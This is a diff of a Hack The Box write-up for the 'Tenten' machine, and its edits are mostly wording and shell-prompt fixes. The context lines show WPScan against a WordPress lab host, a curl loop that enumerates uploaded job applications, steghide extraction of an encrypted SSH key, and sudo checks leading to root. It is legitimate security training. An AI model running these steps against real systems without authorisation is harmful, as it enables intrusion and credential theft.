@@ -82,10 +82,10 @@ Looking around I find a user called Takis:
 
 ![tenten-takis](/assets/images/2020-07-29-22-22-20.png)
 
-This is a WordPress site, we can try scanning it with WPScan. Note that for latest versions of WPScan you now needs API token to do vulnerability checks, sign up [here](https://wpvulndb.com/users/sign_up) if you haven't got an account.
+This is a WordPress site, we can try scanning it with WPScan. Note that for latest versions of WPScan you now need API token to do vulnerability checks, sign up [here](https://wpvulndb.com/users/sign_up) if you haven't got an account.
 
 ```text
-root@Kali:~/htb# wpscan --url http://10.10.10.10 --api-token <<HIDDEN>>
+root@kali:~/htb/machines/tenten# wpscan --url http://10.10.10.10 --api-token <<HIDDEN>>
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -185,7 +185,7 @@ We can use curl to see what applications have been made:
 ## Gaining Access
 
 ```text
-root@kali:~/htb# for i in $(seq 1 20); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
+root@kali:~/htb/machines/tenten# for i in $(seq 1 20); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
 
 1: <title>Job Application: Hello world! &#8211; Job Portal</title>
 2: <title>Job Application: Sample Page &#8211; Job Portal</title>
@@ -307,6 +307,7 @@ Removing libfluidsynth1:amd64 (1.1.11-1+b1) ...
 Removing libigdgmm9:amd64 (19.2.3+ds1-2) ...
 Processing triggers for man-db (2.8.5-2) ...
 Processing triggers for libc-bin (2.29-3) ...
+
 root@kali:~/htb/machines/tenten# steghide extract -sf HackerAccessGranted.jpg
 Enter passphrase:
 wrote extracted data to "id_rsa".
@@ -319,6 +320,7 @@ We find it has an ssh rsa key hidden inside:
 ```text
 root@kali:~/htb/machines/tenten# file id_rsa
 id_rsa: PEM RSA private key
+
 root@kali:~/htb/machines/tenten# cat id_rsa
 -----BEGIN RSA PRIVATE KEY-----
 Proc-Type: 4,ENCRYPTED
@@ -422,7 +424,7 @@ takis@tenten:~$ <<HIDDEN>>
 
 ## Privilege Escalation
 
-Now we need to escalate to root. One of the first things I check is sudo settings:
+Now we need to escalate to root. One of the first things I check is sudo for the user I'm logged in as:
 
 ```text
 takis@tenten:~$ sudo -l
@@ -455,5 +457,6 @@ root.txt
 
 root@tenten:~# cat /root/root.txt
 root@tenten:~# <<HIDDEN>>
+```
 
 All done. See you next time.
